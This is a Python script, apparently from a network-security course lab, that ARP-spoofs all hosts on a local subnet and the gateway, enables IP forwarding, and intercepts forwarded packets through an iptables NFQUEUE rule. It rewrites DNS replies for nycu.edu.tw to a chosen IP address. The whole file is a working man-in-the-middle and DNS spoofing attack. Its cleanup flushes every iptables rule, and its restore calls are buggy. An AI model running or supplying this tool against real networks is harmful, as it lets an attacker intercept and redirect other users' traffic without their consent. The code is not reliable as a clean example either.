#!/usr/bin/env python3
import scapy.all as scapy
import time
import os
import socket
import netifaces
import netfilterqueue
import scapy.all as scapy
import threading
#victim ip = 192.168.132.132 mac = 00:0c:29:33:7d:a8
#attacker ip = 192.168.132.131


def get_my_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname + ".local")
    return local_ip

def get_gateway_ip():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]
    

def enable_ipv4_forwarding():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ipv4_forwarding():
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')


def scan(ip, gateway_ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print("IP\t\t\tMAC Address\n-------------------------------------------")
    for element in answered_list:
        if(element[1].psrc != gateway_ip):
            print(element[1].psrc + "\t\t" + element[1].hwsrc)
    return answered_list

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc #hw is the mac address


def ARP_spoof(target_ip, spoof_ip): 
    packet = scapy.ARP(op = 2, pdst = target_ip, hwsrc = scapy.Ether().src, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(dst_ip, dst_mac, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = src_mac)
    scapy.send(packet, verbose=False)

def run_arp_spoof():

    gateway_ip = str(get_gateway_ip())
    attacker_ip = str(get_my_ip())
    enable_ipv4_forwarding()

    ip_list = scan(gateway_ip + "/24", gateway_ip)
    try:
        
        while True:
            for element in ip_list: # search all the other in this subnet 
                ARP_spoof(element[1].psrc, gateway_ip) #tell everybody that me(attacker mac) is AP
                ARP_spoof(gateway_ip, element[1].psrc)
            
            time.sleep(0.1)
            


    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        for element in ip_list:
            restore(element[1].psrc, gateway_ip)

        print("[+] Arp Spoof Stopped")
        disable_ipv4_forwarding()

def process_packet(packet):
    # scapy for create/analysis/send/recieve packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if b"nycu.edu.tw" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="140.113.207.237")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def DNS_spoofing():
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule 
    # 讓封包定位到python

    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

    # instantiate the netfilter queue
    queue = netfilterqueue.NetfilterQueue()

    try:
        # bind the queue number to our callback process_packet and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()


    except KeyboardInterrupt:
        # if want to exit, make sure we remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")
    finally:
        os.system("iptables --flush")

arp = threading.Thread(target = run_arp_spoof, daemon = True)
arp.start()
dns_thread = threading.Thread(target = DNS_spoofing, daemon = True)
dns_thread.start()
while True:
    try:
        time.sleep(0.1)
    except KeyboardInterrupt:
        print("Stopped")
